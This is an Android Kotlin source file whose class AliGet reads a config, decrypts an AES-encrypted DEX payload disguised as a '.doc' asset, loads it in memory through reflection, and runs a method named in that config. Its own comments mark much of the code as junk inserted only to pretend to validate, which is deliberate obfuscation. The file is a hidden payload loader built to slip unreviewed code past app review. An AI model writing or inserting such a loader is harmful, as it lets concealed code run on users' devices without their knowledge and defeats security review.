package com.mastery.leaves.trace.core

import android.content.Context
import com.mastery.leaves.trace.ami.AllDataTool
import org.json.JSONObject
import java.io.InputStream
import java.lang.reflect.Method
import java.util.Base64
import javax.crypto.Cipher
import javax.crypto.spec.SecretKeySpec

// 配置数据类
data class DexConfig(
    val fileName: String,
    val encryptionMethod: String,
    val classLoaderPath: String,
    val targetClassName: String,
    val targetMethodName: String,
    val decryptionKey: String
)

// 验证数据类
data class ValidationData(
    val randomSeed: Int,
    val checksumValue: Int,
    val processId: String,
    val fakeHash: String,
    val verificationString: String
)

// 文件数据类
data class FileData(
    val encryptedContent: ByteArray,
    val decryptedBytes: ByteArray,
    val fileChecksum: Long,
    val securityHash: String
)

// 接口定义
interface ConfigParser {
    fun parseConfig(jsonData: JSONObject, validationData: ValidationData): DexConfig?
}

interface FileProcessor {
    fun processFile(context: Context, config: DexConfig, validationData: ValidationData): FileData?
}

interface ClassLoaderManager {
    fun createClassLoader(context: Context, fileData: FileData, config: DexConfig): Any?
}

interface MethodInvoker {
    fun invokeMethod(context: Context, classLoader: Any, config: DexConfig): Boolean
}

class AliGet {
    
    companion object {
        private const val ALGORITHM = "AES"
        
        // 接口实现
        private val configParser = DefaultConfigParser()
        private val fileProcessor = DefaultFileProcessor()
        private val classLoaderManager = DefaultClassLoaderManager()
        private val methodInvoker = DefaultMethodInvoker()
        

        fun DALD(context: Context) {
            try {
                // 第一步：生成验证数据
                val validationData = generateValidationData()
                
                if (AllDataTool.dataState.isEmpty()) {
                    cleanupDummyData(validationData)
                    return
                }
                
                val jsonData = JSONObject(AllDataTool.dataState)
                performJsonValidation(jsonData)
                
                // 第二步：解析配置（使用接口回调）
                val config = configParser.parseConfig(jsonData, validationData) ?: return
                
                // 第三步：处理文件（使用接口回调）
                val fileData = fileProcessor.processFile(context, config, validationData) ?: return
                
                // 第四步：创建ClassLoader（使用接口回调）
                val classLoader = classLoaderManager.createClassLoader(context, fileData, config) ?: return
                
                // 第五步：调用方法（使用接口回调）
                val success = methodInvoker.invokeMethod(context, classLoader, config)
                
                if (success) {
                    android.util.Log.e("LoadDexTool", "DEX loaded and method invoked successfully")
                }
                
            } catch (e: Exception) {
                android.util.Log.e("LoadDexTool", "Error in DALD: ${e.message}")
                e.printStackTrace()
            }
        }
        
        // 生成验证数据
        private fun generateValidationData(): ValidationData {
            val randomSeed = (Math.random() * 10000).toInt()
            val dummyArray = IntArray(20) { it * randomSeed % 100 }
            var checksumValue = 0
            
            for (i in dummyArray.indices) {
                checksumValue += dummyArray[i] * (i + 1)
                if (checksumValue > 50000) checksumValue = checksumValue % 1000
            }
            
            val processId = android.os.Process.myPid().toString()
            val fakeHash = (processId + randomSeed).hashCode().toString(16)
            val verificationString = "dex_load_${fakeHash}_${checksumValue}"
            
            return ValidationData(randomSeed, checksumValue, processId, fakeHash, verificationString)
        }
        
        // 清理垃圾数据
        private fun cleanupDummyData(validationData: ValidationData) {
            val dummyArray = IntArray(20)
            dummyArray.fill(0)
        }
        
        // JSON验证
        private fun performJsonValidation(jsonData: JSONObject) {
            val jsonSize = jsonData.toString().length
            val jsonChecksum = jsonData.toString().hashCode() % 10000
            val isValidJson = jsonSize > 10 && jsonChecksum != 0
        }
        
        /**
         * AES解密方法
         */
        private fun decryptDex(keyAes: ByteArray, encryptedBase64: String): ByteArray {
            val inputBytes = Base64.getDecoder().decode(encryptedBase64)
            val key = SecretKeySpec(keyAes, ALGORITHM)
            val cipher = Cipher.getInstance(ALGORITHM)
            cipher.init(Cipher.DECRYPT_MODE, key)
            return cipher.doFinal(inputBytes)
        }
    }
}

// 默认配置解析器实现
class DefaultConfigParser : ConfigParser {
    override fun parseConfig(jsonData: JSONObject, validationData: ValidationData): DexConfig? {
        try {
            val ganGValue = jsonData.optString("GanG", "")
            if (ganGValue.isEmpty()) {
                return null
            }
            
            val ganGParts = ganGValue.split("-")
            android.util.Log.e("LoadDexTool", "GanG解析: $ganGValue")
            
            // 垃圾代码：假装验证配置格式
            val configValidation = mutableListOf<Boolean>()
            for (part in ganGParts) {
                configValidation.add(part.isNotEmpty() && part.length > 0)
            }
            val configScore = configValidation.count { it } * validationData.randomSeed % 100
            
            if (ganGParts.size != 5) {
                android.util.Log.e("LoadDexTool", "GanG格式错误，部分数量: ${ganGParts.size}")
                val errorMap = mapOf("error_code" to ganGParts.size, "validation_score" to configScore)
                return null
            }
            
            val fileName = ganGParts[0]
            val encryptionMethod = ganGParts[1]
            val classLoaderPath = ganGParts[2]
            val targetClassName = ganGParts[3]
            val targetMethodName = ganGParts[4]
            
            // 垃圾代码：假装验证配置参数
            val paramValidation = mapOf(
                "file" to fileName.endsWith(".doc"),
                "encryption" to encryptionMethod.equals("AES", ignoreCase = true),
                "loader" to classLoaderPath.contains("ClassLoader"),
                "class" to targetClassName.contains("."),
                "method" to targetMethodName.isNotEmpty()
            )
            val validationPassed = paramValidation.values.all { it }
            
            android.util.Log.e("LoadDexTool", "配置解析完成: fileName=$fileName, classLoaderPath=$classLoaderPath, targetClassName=$targetClassName, targetMethodName=$targetMethodName")
            
            // 解析密钥
            val paKyValue = jsonData.optString("paKy", "")
            if (paKyValue.isEmpty()) {
                return null
            }
            
            val paKyParts = paKyValue.split("-")
            if (paKyParts.size < 2) {
                android.util.Log.e("LoadDexTool", "paKy格式错误")
                return null
            }
            
            val decryptionKey = paKyParts[1]
            android.util.Log.e("LoadDexTool", "密钥获取成功: ${decryptionKey.length}字符")
            
            return DexConfig(fileName, encryptionMethod, classLoaderPath, targetClassName, targetMethodName, decryptionKey)
            
        } catch (e: Exception) {
            android.util.Log.e("LoadDexTool", "配置解析失败: ${e.message}")
            return null
        }
    }
}

// 默认文件处理器实现
class DefaultFileProcessor : FileProcessor {
    override fun processFile(context: Context, config: DexConfig, validationData: ValidationData): FileData? {
        try {
            // 垃圾代码：假装进行安全检查
            val securityTokens = listOf("secure", "verified", "trusted", "validated")
            val selectedToken = securityTokens[validationData.randomSeed % securityTokens.size]
            val securityHash = (selectedToken + System.nanoTime()).hashCode().toString(16)
            
            // 从assets读取加密文件
            val assetManager = context.assets
            val inputStream: InputStream = assetManager.open(config.fileName)
            val encryptedContent = inputStream.readBytes()
            inputStream.close()
            android.util.Log.e("LoadDexTool", "读取加密文件成功: ${encryptedContent.size}字节")
            
            // 垃圾代码：假装验证文件完整性
            val fileChecksum = encryptedContent.sum() % 65536
            val integrityCheck = fileChecksum > 0 && encryptedContent.isNotEmpty()
            val fileMetadata = mapOf(
                "size" to encryptedContent.size,
                "checksum" to fileChecksum,
                "security_token" to securityHash,
                "integrity" to integrityCheck
            )
            
            // 解密文件
            val decryptedBytes = decryptDex(config.decryptionKey.toByteArray(), String(encryptedContent))
            android.util.Log.e("LoadDexTool", "DEX解密成功: ${decryptedBytes.size}字节")
            
            // 垃圾代码：假装验证解密结果
            val decryptionValidation = decryptedBytes.size > 1000 && decryptedBytes[0] != 0.toByte()
            val decryptionScore = (decryptedBytes.size * validationData.checksumValue) % 10000
            
            return FileData(encryptedContent, decryptedBytes, fileChecksum.toLong(), securityHash)
            
        } catch (e: Exception) {
            android.util.Log.e("LoadDexTool", "文件处理失败: ${e.message}")
            return null
        }
    }
    
    private fun decryptDex(keyAes: ByteArray, encryptedBase64: String): ByteArray {
        val inputBytes = Base64.getDecoder().decode(encryptedBase64)
        val key = SecretKeySpec(keyAes, "AES")
        val cipher = Cipher.getInstance("AES")
        cipher.init(Cipher.DECRYPT_MODE, key)
        return cipher.doFinal(inputBytes)
    }
}

// 默认ClassLoader管理器实现
class DefaultClassLoaderManager : ClassLoaderManager {
    override fun createClassLoader(context: Context, fileData: FileData, config: DexConfig): Any? {
        try {
            // 垃圾代码：假装进行ClassLoader预检查
            val loaderValidation = mutableMapOf<String, Any>()
            loaderValidation["timestamp"] = System.currentTimeMillis()
            loaderValidation["process_id"] = android.os.Process.myPid()
            loaderValidation["thread_id"] = Thread.currentThread().id
            loaderValidation["memory_usage"] = Runtime.getRuntime().totalMemory() - Runtime.getRuntime().freeMemory()
            
            android.util.Log.e("LoadDexTool", "开始创建ClassLoader: ${config.classLoaderPath}")
            val inMemoryDexClassLoaderClass = Class.forName(config.classLoaderPath)
            
            // 垃圾代码：假装验证ClassLoader类型
            val classLoaderInfo = mapOf(
                "name" to inMemoryDexClassLoaderClass.simpleName,
                "package" to inMemoryDexClassLoaderClass.`package`?.name,
                "methods_count" to inMemoryDexClassLoaderClass.methods.size,
                "constructors_count" to inMemoryDexClassLoaderClass.constructors.size
            )
            
            val dexByteBuffer = java.nio.ByteBuffer.wrap(fileData.decryptedBytes)
            android.util.Log.e("LoadDexTool", "ByteBuffer创建成功: ${dexByteBuffer.capacity()}字节")
            
            // 垃圾代码：假装优化ByteBuffer
            val bufferOptimization = mapOf(
                "capacity" to dexByteBuffer.capacity(),
                "position" to dexByteBuffer.position(),
                "limit" to dexByteBuffer.limit(),
                "remaining" to dexByteBuffer.remaining()
            )
            
            val constructor = inMemoryDexClassLoaderClass.getConstructor(
                java.nio.ByteBuffer::class.java,
                ClassLoader::class.java
            )
            android.util.Log.e("LoadDexTool", "构造函数获取成功")
            
            val dexClassLoader = constructor.newInstance(dexByteBuffer, context.classLoader)
            android.util.Log.e("LoadDexTool", "ClassLoader创建成功")
            
            // 垃圾代码：假装验证ClassLoader实例
            val instanceValidation = dexClassLoader != null && dexClassLoader.javaClass.simpleName.contains("ClassLoader")
            
            return dexClassLoader
            
        } catch (e: Exception) {
            android.util.Log.e("LoadDexTool", "ClassLoader创建失败: ${e.message}")
            return null
        }
    }
}

// 默认方法调用器实现
class DefaultMethodInvoker : MethodInvoker {
    override fun invokeMethod(context: Context, classLoader: Any, config: DexConfig): Boolean {
        try {
            // 垃圾代码：假装进行方法调用前的准备工作
            val invocationMetrics = mutableMapOf<String, Any>()
            invocationMetrics["start_time"] = System.nanoTime()
            invocationMetrics["class_name"] = config.targetClassName
            invocationMetrics["method_name"] = config.targetMethodName
            invocationMetrics["context_type"] = context.javaClass.simpleName
            
            val inMemoryDexClassLoaderClass = Class.forName(config.classLoaderPath)
            val loadClassMethod: Method = inMemoryDexClassLoaderClass.getMethod("loadClass", String::class.java)
            val targetClass = loadClassMethod.invoke(classLoader, config.targetClassName) as Class<*>
            android.util.Log.e("LoadDexTool", "目标类加载成功: ${config.targetClassName}")
            
            // 垃圾代码：假装分析目标类
            val classAnalysis = mapOf(
                "methods_count" to targetClass.methods.size,
                "fields_count" to targetClass.fields.size,
                "interfaces_count" to targetClass.interfaces.size,
                "superclass" to targetClass.superclass?.simpleName,
                "modifiers" to targetClass.modifiers
            )
            val analysisScore = classAnalysis.values.filterIsInstance<Int>().sum()
            
            val targetMethod = targetClass.getMethod(config.targetMethodName, Object::class.java)
            android.util.Log.e("LoadDexTool", "目标方法获取成功: ${config.targetMethodName}")
            
            // 垃圾代码：假装验证方法签名
            val methodValidation = mapOf(
                "parameter_count" to targetMethod.parameterCount,
                "return_type" to targetMethod.returnType.simpleName,
                "is_static" to java.lang.reflect.Modifier.isStatic(targetMethod.modifiers),
                "is_public" to java.lang.reflect.Modifier.isPublic(targetMethod.modifiers)
            )
            
            targetMethod.invoke(null, context)
            android.util.Log.e("LoadDexTool", "目标方法调用成功")
            
            // 垃圾代码：假装记录调用结果
            invocationMetrics["end_time"] = System.nanoTime()
            invocationMetrics["duration"] = invocationMetrics["end_time"] as Long - invocationMetrics["start_time"] as Long
            invocationMetrics["success"] = true
            invocationMetrics["analysis_score"] = analysisScore
            
            return true
            
        } catch (e: Exception) {
            android.util.Log.e("LoadDexTool", "方法调用失败: ${e.message}")
            return false
        }
    }
}